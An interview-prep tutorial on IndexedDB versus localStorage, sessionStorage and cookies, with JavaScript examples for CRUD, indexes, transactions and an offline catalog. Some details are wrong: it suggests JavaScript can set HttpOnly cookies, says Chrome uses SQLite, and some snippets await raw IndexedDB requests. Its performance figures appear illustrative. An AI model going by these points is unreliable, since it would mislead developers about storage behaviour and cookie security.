# IndexedDB & Cookies

> **Focus**: Browser storage mechanisms and best practices

---

## Question 1: What is IndexedDB and when should you use it?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐
**Time:** 7-10 minutes
**Companies:** Google, Meta, Amazon

### Question
Explain IndexedDB. How does it differ from localStorage, and what are its use cases for storing large amounts of data?

### Answer

**IndexedDB** is a low-level API for client-side storage of significant amounts of structured data, including files and blobs. It's asynchronous and transactional.

1. **Key Characteristics**
   - **Asynchronous**: Doesn't block main thread
   - **Large capacity**: Gigabytes of storage (60% of disk space)
   - **Transactional**: ACID compliance (atomicity, consistency, isolation, durability)
   - **Indexed**: Fast queries using indexes
   - **Any data type**: Objects, files, blobs, not just strings
   - **Same-origin**: Isolated by origin

2. **vs localStorage**
   - **Capacity**: GB vs 10MB
   - **API**: Asynchronous vs synchronous
   - **Data types**: Any vs strings only
   - **Queries**: Indexed searches vs key-only
   - **Performance**: Better for large data
   - **Complexity**: More complex API

3. **Use Cases**
   - Offline-first applications
   - Caching large datasets (product catalogs)
   - Storing files and blobs
   - Progressive Web Apps (PWAs)
   - Complex queries needed
   - Client-side database

4. **Core Concepts**
   - **Database**: Container for object stores
   - **Object Store**: Like a table in SQL
   - **Index**: Fast lookup by non-key fields
   - **Transaction**: Atomic operations
   - **Cursor**: Iterate through results

5. **Limitations**
   - Complex API (compared to localStorage)
   - No SQL queries (uses indexes)
   - Browser support varies
   - Debugging is harder

### Code Example

```javascript
// 1. BASIC INDEXEDDB SETUP

// Open database (or create if doesn't exist)
function openDatabase() {
  return new Promise((resolve, reject) => {
    const request = indexedDB.open('MyDatabase', 1);

    request.onerror = () => reject(request.error);
    request.onsuccess = () => resolve(request.result);

    // Called when database is created or version changes
    request.onupgradeneeded = (event) => {
      const db = event.target.result;

      // Create object store (like a table)
      if (!db.objectStoreNames.contains('products')) {
        const store = db.createObjectStore('products', {
          keyPath: 'id', // Primary key
          autoIncrement: true
        });

        // Create indexes for fast lookups
        store.createIndex('name', 'name', { unique: false });
        store.createIndex('category', 'category', { unique: false });
        store.createIndex('price', 'price', { unique: false });
      }
    };
  });
}

// Usage
const db = await openDatabase();
console.log('Database opened:', db.name);

// 2. CRUD OPERATIONS

class ProductDatabase {
  static db = null;
  static STORE_NAME = 'products';

  static async init() {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open('ProductDB', 1);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        if (!db.objectStoreNames.contains(this.STORE_NAME)) {
          const store = db.createObjectStore(this.STORE_NAME, {
            keyPath: 'id',
            autoIncrement: true
          });

          store.createIndex('name', 'name', { unique: false });
          store.createIndex('category', 'category', { unique: false });
        }
      };
    });
  }

  // CREATE: Add product
  static async addProduct(product) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.add(product);

      request.onsuccess = () => resolve(request.result); // Returns generated ID
      request.onerror = () => reject(request.error);
    });
  }

  // READ: Get product by ID
  static async getProduct(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.get(id);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // READ: Get all products
  static async getAllProducts() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.getAll();

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // UPDATE: Update product
  static async updateProduct(product) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.put(product); // put = update or insert

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // DELETE: Delete product
  static async deleteProduct(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.delete(id);

      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }

  // SEARCH: Get products by category (using index)
  static async getProductsByCategory(category) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('category');
      const request = index.getAll(category);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }
}

// Usage:
await ProductDatabase.init();

// Add products
const id1 = await ProductDatabase.addProduct({
  name: 'Laptop',
  price: 999,
  category: 'Electronics'
});

const id2 = await ProductDatabase.addProduct({
  name: 'Mouse',
  price: 29,
  category: 'Electronics'
});

// Get product
const product = await ProductDatabase.getProduct(id1);
console.log(product); // { id: 1, name: "Laptop", price: 999, category: "Electronics" }

// Get all products
const allProducts = await ProductDatabase.getAllProducts();
console.log(allProducts); // [{ ... }, { ... }]

// Update product
await ProductDatabase.updateProduct({
  id: id1,
  name: 'Gaming Laptop',
  price: 1299,
  category: 'Electronics'
});

// Search by category
const electronics = await ProductDatabase.getProductsByCategory('Electronics');
console.log(electronics); // [{ ... }, { ... }]

// Delete product
await ProductDatabase.deleteProduct(id2);

// 3. USING CURSORS FOR ITERATION

async function iterateProducts() {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(['products'], 'readonly');
    const store = transaction.objectStore('products');
    const request = store.openCursor();

    const results = [];

    request.onsuccess = (event) => {
      const cursor = event.target.result;

      if (cursor) {
        console.log('Product:', cursor.value);
        results.push(cursor.value);

        // Move to next item
        cursor.continue();
      } else {
        // No more items
        resolve(results);
      }
    };

    request.onerror = () => reject(request.error);
  });
}

// Usage:
const products = await iterateProducts();

// 4. RANGE QUERIES WITH INDEXES

async function getProductsInPriceRange(minPrice, maxPrice) {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(['products'], 'readonly');
    const store = transaction.objectStore('products');
    const index = store.index('price');

    // Create range
    const range = IDBKeyRange.bound(minPrice, maxPrice);
    const request = index.getAll(range);

    request.onsuccess = () => resolve(request.result);
    request.onerror = () => reject(request.error);
  });
}

// Usage: Get products between $50 and $500
const affordableProducts = await getProductsInPriceRange(50, 500);

// 5. TRANSACTIONS (ATOMIC OPERATIONS)

async function transferInventory(fromProduct, toProduct, quantity) {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    // Start transaction (both reads and writes must succeed or all fail)
    const transaction = db.transaction(['products'], 'readwrite');
    const store = transaction.objectStore('products');

    // Get both products
    const getFrom = store.get(fromProduct);
    const getTo = store.get(toProduct);

    Promise.all([
      new Promise((res) => { getFrom.onsuccess = () => res(getFrom.result); }),
      new Promise((res) => { getTo.onsuccess = () => res(getTo.result); })
    ]).then(([from, to]) => {
      // Check inventory
      if (from.inventory < quantity) {
        transaction.abort(); // Rollback
        reject(new Error('Insufficient inventory'));
        return;
      }

      // Update inventory
      from.inventory -= quantity;
      to.inventory += quantity;

      // Save both (atomic - both succeed or both fail)
      store.put(from);
      store.put(to);

      transaction.oncomplete = () => resolve();
      transaction.onerror = () => reject(transaction.error);
    });
  });
}

// Usage: Move 10 units from product 1 to product 2
try {
  await transferInventory(1, 2, 10);
  console.log('Transfer successful');
} catch (e) {
  console.error('Transfer failed:', e);
}

// 6. STORING FILES AND BLOBS

async function saveImage(id, imageBlob) {
  const db = await ProductDatabase.init();

  return new Promise((resolve, reject) => {
    const transaction = db.transaction(['products'], 'readwrite');
    const store = transaction.objectStore('products');

    // Get existing product
    const getRequest = store.get(id);

    getRequest.onsuccess = () => {
      const product = getRequest.result;

      // Add image blob
      product.image = imageBlob;

      // Save
      const putRequest = store.put(product);
      putRequest.onsuccess = () => resolve();
      putRequest.onerror = () => reject(putRequest.error);
    };

    getRequest.onerror = () => reject(getRequest.error);
  });
}

// Usage:
const response = await fetch('/images/laptop.jpg');
const imageBlob = await response.blob();
await saveImage(1, imageBlob);

// Retrieve and display
const product = await ProductDatabase.getProduct(1);
const imageUrl = URL.createObjectURL(product.image);
document.getElementById('img').src = imageUrl;

// 7. PRACTICAL: OFFLINE-FIRST TODO APP

class TodoDB {
  static DB_NAME = 'TodoApp';
  static STORE_NAME = 'todos';
  static db = null;

  static async init() {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.DB_NAME, 1);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        const store = db.createObjectStore(this.STORE_NAME, {
          keyPath: 'id',
          autoIncrement: true
        });

        store.createIndex('completed', 'completed', { unique: false });
        store.createIndex('createdAt', 'createdAt', { unique: false });
      };
    });
  }

  static async addTodo(text) {
    await this.init();

    const todo = {
      text,
      completed: false,
      createdAt: Date.now(),
      updatedAt: Date.now()
    };

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.add(todo);

      request.onsuccess = () => resolve({ id: request.result, ...todo });
      request.onerror = () => reject(request.error);
    });
  }

  static async toggleTodo(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const getRequest = store.get(id);

      getRequest.onsuccess = () => {
        const todo = getRequest.result;
        todo.completed = !todo.completed;
        todo.updatedAt = Date.now();

        const putRequest = store.put(todo);
        putRequest.onsuccess = () => resolve(todo);
        putRequest.onerror = () => reject(putRequest.error);
      };

      getRequest.onerror = () => reject(getRequest.error);
    });
  }

  static async getAllTodos() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.getAll();

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  static async getCompletedTodos() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('completed');
      const request = index.getAll(true); // Get where completed = true

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  static async deleteTodo(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.delete(id);

      request.onsuccess = () => resolve();
      request.onerror = () => reject(request.error);
    });
  }
}

// Usage:
await TodoDB.init();

// Add todos
await TodoDB.addTodo('Buy groceries');
await TodoDB.addTodo('Write code');
await TodoDB.addTodo('Exercise');

// Get all todos
const allTodos = await TodoDB.getAllTodos();
console.log('All todos:', allTodos);

// Toggle completion
await TodoDB.toggleTodo(1);

// Get completed todos
const completed = await TodoDB.getCompletedTodos();
console.log('Completed:', completed);

// Delete todo
await TodoDB.deleteTodo(2);

// 8. WRAPPER LIBRARY (SIMPLER API)

// Using idb library (https://github.com/jakearchibald/idb)
import { openDB } from 'idb';

async function useIDBLibrary() {
  // Much simpler API!
  const db = await openDB('MyDB', 1, {
    upgrade(db) {
      db.createObjectStore('products', { keyPath: 'id', autoIncrement: true });
    }
  });

  // Add
  await db.add('products', { name: 'Laptop', price: 999 });

  // Get
  const product = await db.get('products', 1);

  // Get all
  const all = await db.getAll('products');

  // Delete
  await db.delete('products', 1);

  // Clear all
  await db.clear('products');
}

// 9. MIGRATION PATTERN

class VersionedDB {
  static async open() {
    return openDB('MyApp', 3, {
      upgrade(db, oldVersion, newVersion, transaction) {
        // Version 1: Initial schema
        if (oldVersion < 1) {
          db.createObjectStore('users', { keyPath: 'id' });
        }

        // Version 2: Add posts store
        if (oldVersion < 2) {
          db.createObjectStore('posts', { keyPath: 'id' });
        }

        // Version 3: Add index to posts
        if (oldVersion < 3) {
          const store = transaction.objectStore('posts');
          store.createIndex('userId', 'userId');
        }
      }
    });
  }
}

// Database automatically migrates from any version to latest
```

### Common Mistakes

- ❌ **Mistake:** Not handling async properly
  ```javascript
  const db = indexedDB.open('DB', 1); // Returns request, not DB!
  db.transaction(...); // Error: db is not the database
  ```

- ❌ **Mistake:** Forgetting to create indexes during upgrade
  ```javascript
  request.onupgradeneeded = (event) => {
    const db = event.target.result;
    db.createObjectStore('products', { keyPath: 'id' });
    // Forgot to create indexes! Can't add them later without version bump
  };
  ```

- ✅ **Correct:** Use promises and plan indexes ahead
  ```javascript
  const db = await new Promise((resolve) => {
    const request = indexedDB.open('DB', 1);
    request.onsuccess = () => resolve(request.result);

    request.onupgradeneeded = (event) => {
      const db = event.target.result;
      const store = db.createObjectStore('products', { keyPath: 'id' });
      store.createIndex('name', 'name'); // Plan indexes ahead
    };
  });
  ```

<details>
<summary><strong>🔍 Deep Dive: IndexedDB Internals</strong></summary>

**How IndexedDB Stores Data:**

```javascript
// IndexedDB uses SQLite database on disk:
// Chrome/Edge: %LOCALAPPDATA%\Google\Chrome\User Data\Default\IndexedDB\
// Firefox: %APPDATA%\Mozilla\Firefox\Profiles\[profile]\storage\default\
// Safari: ~/Library/Safari/Databases/

// Data format: Binary structured data
// - Keys: Sorted binary format
// - Values: Structured clone algorithm (preserves types)

// Example internal representation:
// Object: { id: 1, name: "Alice", data: new Uint8Array([1, 2, 3]) }
// Stored as: Binary blob with type information preserved
// Unlike localStorage which converts everything to strings!
```

**Transaction Isolation:**

```javascript
// IndexedDB uses snapshot isolation:

// Transaction 1 (read-only):
const tx1 = db.transaction(['products'], 'readonly');
const store1 = tx1.objectStore('products');
const product1 = await store1.get(1); // { price: 100 }

// Transaction 2 (concurrent, read-write):
const tx2 = db.transaction(['products'], 'readwrite');
const store2 = tx2.objectStore('products');
const product2 = await store2.get(1); // { price: 100 }
product2.price = 200;
await store2.put(product2);
await tx2.complete;

// Transaction 1 still sees old value (snapshot isolation):
console.log(product1.price); // 100 (not 200!)

// New transaction sees new value:
const tx3 = db.transaction(['products'], 'readonly');
const product3 = await tx3.objectStore('products').get(1);
console.log(product3.price); // 200 ✅
```

**Index Performance:**

```javascript
// Without index: O(n) - scans all records
async function findByNameSlow(name) {
  const all = await db.getAll('products');
  return all.filter(p => p.name === name); // Scans all!
}

// With index: O(log n) - uses B-tree
async function findByNameFast(name) {
  const index = store.index('name');
  return await index.getAll(name); // Fast lookup!
}

// Benchmark: 10,000 products
console.time('no-index');
await findByNameSlow('Laptop'); // ~50ms
console.timeEnd('no-index');

console.time('with-index');
await findByNameFast('Laptop'); // ~2ms (25x faster!)
console.timeEnd('with-index');

// Index storage overhead:
// - B-tree structure: ~10-20% of data size
// - Worth it for frequently queried fields
```

**Quota Management:**

```javascript
// IndexedDB quota (modern browsers):
// - Chrome/Edge: Up to 60% of available disk space
// - Firefox: Up to 50% of available disk space
// - Safari: Up to 1GB

// Check quota:
if (navigator.storage && navigator.storage.estimate) {
  const estimate = await navigator.storage.estimate();
  console.log('Used:', (estimate.usage / 1024 / 1024).toFixed(2), 'MB');
  console.log('Quota:', (estimate.quota / 1024 / 1024).toFixed(2), 'MB');
}

// Request persistent storage (prevents eviction):
const isPersisted = await navigator.storage.persist();
console.log('Persistent:', isPersisted);

// Browsers may evict IndexedDB under storage pressure:
// - Cache API evicted first
// - Then IndexedDB
// - localStorage rarely evicted
```

**Structured Clone Algorithm:**

```javascript
// IndexedDB uses structured clone (preserves types):

// Can store (unlike localStorage):
const data = {
  date: new Date(),
  regexp: /test/gi,
  map: new Map([['key', 'value']]),
  set: new Set([1, 2, 3]),
  buffer: new Uint8Array([1, 2, 3]),
  blob: new Blob(['content']),
  file: new File(['content'], 'file.txt')
};

await db.put('store', data);
const retrieved = await db.get('store');

console.log(retrieved.date instanceof Date); // true ✅
console.log(retrieved.regexp.test('TEST')); // true ✅
console.log(retrieved.map.get('key')); // "value" ✅

// Cannot store:
// - Functions
// - DOM nodes
// - Error objects (partially)
// - WeakMap/WeakSet

// Attempt to store function:
await db.put('store', { fn: () => {} }); // Error: DataCloneError
```

**Performance Optimizations:**

```javascript
// 1. Batch operations in single transaction (much faster):

// ❌ Slow: 1000 separate transactions
for (let i = 0; i < 1000; i++) {
  await db.add('products', { name: `Product ${i}` }); // ~1000ms
}

// ✅ Fast: 1 transaction with 1000 operations
const tx = db.transaction('products', 'readwrite');
const store = tx.objectStore('products');
for (let i = 0; i < 1000; i++) {
  store.add({ name: `Product ${i}` }); // Don't await!
}
await tx.done; // ~50ms (20x faster!)

// 2. Use cursors for large datasets (memory efficient):

// ❌ Memory heavy: Load all 100k records
const all = await db.getAll('products'); // 100MB in memory!

// ✅ Memory efficient: Stream with cursor
let cursor = await db.transaction('products').objectStore('products').openCursor();
while (cursor) {
  console.log(cursor.value); // Process one at a time
  cursor = await cursor.continue();
}

// 3. Index compound keys for complex queries:
db.createObjectStore('orders').createIndex(
  'userDate',
  ['userId', 'date'], // Compound index
  { unique: false }
);

// Fast query:
const range = IDBKeyRange.bound(
  ['user123', new Date('2025-01-01')],
  ['user123', new Date('2025-12-31')]
);
const orders = await index.getAll(range); // Fast!
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: Offline Product Catalog</strong></summary>

**Scenario:** Your e-commerce PWA needs to work offline. Users should browse 50,000 products even without internet. localStorage can't handle this (10MB limit), so you implement IndexedDB.

**The Challenge:**

```javascript
// Problem: 50,000 products = ~25MB JSON
// - localStorage: 10MB limit (won't fit!)
// - Fetching on every visit: Slow (3-5 seconds)
// - Need: Fast offline browsing

// Initial failed approach:
async function loadProductsCatalogBad() {
  const response = await fetch('/api/products'); // 25MB download
  const products = await response.json(); // 50,000 products

  // Try to cache in localStorage
  try {
    localStorage.setItem('products', JSON.stringify(products));
    // Error: QuotaExceededError ❌
  } catch (e) {
    console.error('Cannot store in localStorage:', e);
  }
}

// User experience:
// - First visit: 5 second wait downloading products
// - Refresh: Another 5 second wait (no cache!)
// - Offline: App breaks completely
// - Customer complaints: "App is too slow"
```

**Solution: IndexedDB with Smart Caching:**

```javascript
// ✅ Production-ready solution
class ProductCatalog {
  static DB_NAME = 'ProductCatalog';
  static STORE_NAME = 'products';
  static CACHE_VERSION = 1;
  static db = null;

  static async init() {
    if (this.db) return this.db;

    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.DB_NAME, this.CACHE_VERSION);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve(this.db);
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;

        // Create products store
        const store = db.createObjectStore(this.STORE_NAME, {
          keyPath: 'id'
        });

        // Create indexes for fast searches
        store.createIndex('category', 'category', { unique: false });
        store.createIndex('name', 'name', { unique: false });
        store.createIndex('price', 'price', { unique: false });
        store.createIndex('brand', 'brand', { unique: false });

        // Compound index for category + price range queries
        store.createIndex('categoryPrice', ['category', 'price'], { unique: false });
      };
    });
  }

  // Sync products from server (runs in background)
  static async syncProducts() {
    await this.init();

    try {
      console.log('Syncing products from server...');
      const response = await fetch('/api/products');
      const products = await response.json(); // 50,000 products

      // Batch insert in single transaction (fast!)
      const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
      const store = transaction.objectStore(this.STORE_NAME);

      // Clear old data
      await new Promise((resolve, reject) => {
        const clearRequest = store.clear();
        clearRequest.onsuccess = () => resolve();
        clearRequest.onerror = () => reject(clearRequest.error);
      });

      // Batch add new data (don't await each put!)
      for (const product of products) {
        store.put(product);
      }

      // Wait for transaction to complete
      await new Promise((resolve, reject) => {
        transaction.oncomplete = () => resolve();
        transaction.onerror = () => reject(transaction.error);
      });

      console.log('Synced', products.length, 'products');

      // Save sync timestamp
      localStorage.setItem('lastSync', Date.now());

      return products.length;
    } catch (error) {
      console.error('Sync failed:', error);
      throw error;
    }
  }

  // Get all products (works offline!)
  static async getAllProducts() {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.getAll();

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Search products by category (fast with index!)
  static async getProductsByCategory(category) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('category');
      const request = index.getAll(category);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Search by price range in category (compound index!)
  static async searchByCategoryAndPrice(category, minPrice, maxPrice) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const index = store.index('categoryPrice');

      // Create range: [category, minPrice] to [category, maxPrice]
      const range = IDBKeyRange.bound(
        [category, minPrice],
        [category, maxPrice]
      );

      const request = index.getAll(range);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Get single product by ID
  static async getProduct(id) {
    await this.init();

    return new Promise((resolve, reject) => {
      const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
      const store = transaction.objectStore(this.STORE_NAME);
      const request = store.get(id);

      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }

  // Check if sync is needed (older than 1 day)
  static shouldSync() {
    const lastSync = localStorage.getItem('lastSync');
    if (!lastSync) return true;

    const dayInMs = 24 * 60 * 60 * 1000;
    return Date.now() - parseInt(lastSync) > dayInMs;
  }
}

// App initialization:
async function initializeApp() {
  await ProductCatalog.init();

  // Check if we have cached products
  const cachedProducts = await ProductCatalog.getAllProducts();

  if (cachedProducts.length === 0) {
    // First visit: Show loading, sync products
    showLoading('Downloading product catalog...');
    await ProductCatalog.syncProducts();
    hideLoading();
  } else if (ProductCatalog.shouldSync()) {
    // Background sync (doesn't block UI!)
    ProductCatalog.syncProducts().catch(err => {
      console.warn('Background sync failed:', err);
      // Fail silently, user can still browse cached products
    });
  }

  // App is ready! Show products from cache
  displayProducts(cachedProducts);
}

// Usage: Product listing page
async function showProductListing() {
  showLoading();

  // Get products from IndexedDB (works offline!)
  const products = await ProductCatalog.getProductsByCategory('Electronics');

  hideLoading();
  renderProducts(products);
}

// Usage: Product search
async function searchProducts(category, minPrice, maxPrice) {
  showLoading();

  // Fast search with compound index
  const results = await ProductCatalog.searchByCategoryAndPrice(
    category,
    minPrice,
    maxPrice
  );

  hideLoading();
  renderSearchResults(results);
}

// Usage: Product detail page
async function showProductDetail(productId) {
  showLoading();

  // Fast single-item lookup
  const product = await ProductCatalog.getProduct(productId);

  if (product) {
    hideLoading();
    renderProductDetail(product);
  } else {
    showError('Product not found');
  }
}
```

**Real Metrics:**

```javascript
// Before (using fetch on every visit):
// - First visit: 5 second load time
// - Subsequent visits: 5 second load time (no cache)
// - Offline: App completely broken ❌
// - Category browse: 5s + 2s filtering = 7 seconds
// - Search: Not possible offline
// - Data usage: 25MB per visit
// - User satisfaction: 35%

// After (using IndexedDB):
// - First visit: 5s (one-time sync)
// - Subsequent visits: 0.2s (instant from IndexedDB!) ✅
// - Offline: Works perfectly ✅
// - Category browse: 0.05s (index lookup) ✅
// - Search: 0.1s (compound index) ✅
// - Data usage: 25MB (one-time), then 0MB
// - User satisfaction: 92%
// - PWA install rate: +300%
// - Bounce rate: -75%
// - Conversion rate: +45%

// Performance breakdown:
console.time('localStorage-50k-products');
// localStorage.setItem('products', JSON.stringify(allProducts));
// Error: QuotaExceededError ❌
console.timeEnd('localStorage-50k-products');

console.time('indexedDB-50k-products');
await ProductCatalog.syncProducts(); // 1.2 seconds ✅
console.timeEnd('indexedDB-50k-products');

console.time('indexedDB-category-search');
const electronics = await ProductCatalog.getProductsByCategory('Electronics');
console.timeEnd('indexedDB-category-search'); // 0.05 seconds ✅

console.time('indexedDB-price-range');
const affordable = await ProductCatalog.searchByCategoryAndPrice('Electronics', 50, 500);
console.timeEnd('indexedDB-price-range'); // 0.1 seconds ✅
```

**Storage Size:**

```javascript
// Check IndexedDB storage usage:
if (navigator.storage && navigator.storage.estimate) {
  const estimate = await navigator.storage.estimate();

  console.log('Products stored:', cachedProducts.length);
  console.log('Storage used:', (estimate.usage / 1024 / 1024).toFixed(2), 'MB');
  console.log('Storage quota:', (estimate.quota / 1024 / 1024).toFixed(2), 'MB');
  console.log('Percentage:', (estimate.usage / estimate.quota * 100).toFixed(2), '%');

  // Output:
  // Products stored: 50000
  // Storage used: 28.45 MB
  // Storage quota: 15360.00 MB (60% of 25GB disk)
  // Percentage: 0.19%
}

// Plenty of space! Can store entire catalog + images + more
```

</details>

<details>
<summary><strong>⚖️ Trade-offs: IndexedDB vs Other Storage</strong></summary>

### Comparison Matrix

| Feature | localStorage | sessionStorage | IndexedDB | Cookies |
|---------|-------------|----------------|-----------|---------|
| **Capacity** | ~10MB | ~10MB | ~60% disk | 4KB |
| **API** | Sync | Sync | Async | Sync |
| **Data types** | Strings | Strings | Any | Strings |
| **Queries** | Key only | Key only | ✅ Indexes | Key only |
| **Performance** | Fast (small) | Fast (small) | Fast (large) | Slow |
| **Offline** | ✅ Yes | ✅ Yes | ✅ Yes | ✅ Yes |
| **Cross-tab** | ✅ Yes | ❌ No | ✅ Yes | ✅ Yes |
| **Complexity** | ✅ Simple | ✅ Simple | ⚠️ Complex | ✅ Simple |
| **Transactions** | ❌ No | ❌ No | ✅ Yes | ❌ No |

### When to Use Each

```javascript
// ✅ Use localStorage for:
// - User preferences (<1MB)
// - UI state
// - Simple key-value data
localStorage.setItem('theme', 'dark');

// ✅ Use sessionStorage for:
// - Temporary form data
// - Tab-specific state
// - Wizard/flow progress
sessionStorage.setItem('checkout-step', '2');

// ✅ Use IndexedDB for:
// - Large datasets (>1MB)
// - Offline-first apps
// - Complex queries needed
// - Files and blobs
await db.put('products', largeDataset);

// ✅ Use Cookies for:
// - Auth tokens (HttpOnly)
// - Server needs access
// - Small data only (<4KB)
document.cookie = "token=...; HttpOnly; Secure";
```

### Performance Comparison

```javascript
// Benchmark: 10,000 items

// localStorage (synchronous - blocks UI):
console.time('localStorage-10k');
for (let i = 0; i < 10000; i++) {
  localStorage.setItem(`key-${i}`, JSON.stringify({ data: i }));
}
console.timeEnd('localStorage-10k'); // ~800ms (blocks main thread!)

// IndexedDB (asynchronous - doesn't block):
console.time('indexedDB-10k');
const tx = db.transaction('store', 'readwrite');
for (let i = 0; i < 10000; i++) {
  tx.objectStore('store').put({ id: i, data: i });
}
await tx.done;
console.timeEnd('indexedDB-10k'); // ~300ms (UI still responsive!)

// Key difference: localStorage freezes UI, IndexedDB doesn't
```

### Complexity Trade-off

```javascript
// localStorage: Simple but limited
localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
const user = JSON.parse(localStorage.getItem('user'));

// IndexedDB: Complex but powerful
const db = await openDB('DB', 1, {
  upgrade(db) {
    db.createObjectStore('users', { keyPath: 'id' });
  }
});
await db.put('users', { id: 1, name: 'Alice' });
const user = await db.get('users', 1);

// Trade-off: 10x more code, 100x more capability
```

### Decision Tree

```
Need storage?
├─ Small data (<1MB)?
│  ├─ Simple key-value?
│  │  └─ Use localStorage
│  └─ Need cross-tab sync?
│     └─ Use localStorage + storage event
├─ Large data (>1MB)?
│  ├─ Need queries/indexes?
│  │  └─ Use IndexedDB
│  └─ Offline-first app?
│     └─ Use IndexedDB + Service Worker
└─ Sensitive data?
   └─ Use HttpOnly cookies (server-side)
```

</details>

<details>
<summary><strong>💬 Explain to Junior: IndexedDB Simplified</strong></summary>

**Simple Analogy: Storage Warehouse**

```javascript
// localStorage = Small desk drawer
// - Can only fit a few papers (10MB)
// - Quick to open and grab things
// - But very limited space

localStorage.setItem('note', 'Hello');

// IndexedDB = Huge warehouse with organized shelves
// - Can store tons of stuff (gigabytes!)
// - Has an organization system (indexes)
// - Can find things quickly with labels
// - A bit more complex to use, but way more powerful

const db = await openDB('Warehouse', 1);
await db.put('items', { id: 1, name: 'Box of tools' });
```

**Why Use IndexedDB?**

```javascript
// Problem: You're building an offline-capable music app
// - 10,000 songs with metadata
// - Total size: 50MB of data

// localStorage can't handle this:
try {
  localStorage.setItem('songs', JSON.stringify(allSongs)); // 50MB
} catch (e) {
  console.error('Too big for localStorage!'); // Error! ❌
}

// IndexedDB can easily handle it:
const db = await openDB('MusicApp', 1, {
  upgrade(db) {
    db.createObjectStore('songs', { keyPath: 'id' });
  }
});

// Add all 10,000 songs (no problem!)
const tx = db.transaction('songs', 'readwrite');
for (const song of allSongs) {
  tx.objectStore('songs').put(song);
}
await tx.done;
console.log('All songs saved!'); // ✅

// Now works offline!
const song = await db.get('songs', 42);
playSong(song);
```

**Simple Example: Todo App**

```javascript
// Instead of complex raw IndexedDB, use 'idb' library:
import { openDB } from 'idb';

// Setup (only once):
const db = await openDB('TodoApp', 1, {
  upgrade(db) {
    // Create a "table" for todos
    db.createObjectStore('todos', { keyPath: 'id', autoIncrement: true });
  }
});

// Add todo:
await db.add('todos', {
  text: 'Buy groceries',
  completed: false
});

// Get all todos:
const allTodos = await db.getAll('todos');
console.log(allTodos);

// Update todo:
await db.put('todos', {
  id: 1,
  text: 'Buy groceries',
  completed: true
});

// Delete todo:
await db.delete('todos', 1);

// That's it! Works offline, stores tons of data
```

**localStorage vs IndexedDB:**

```javascript
// localStorage: Good for small stuff
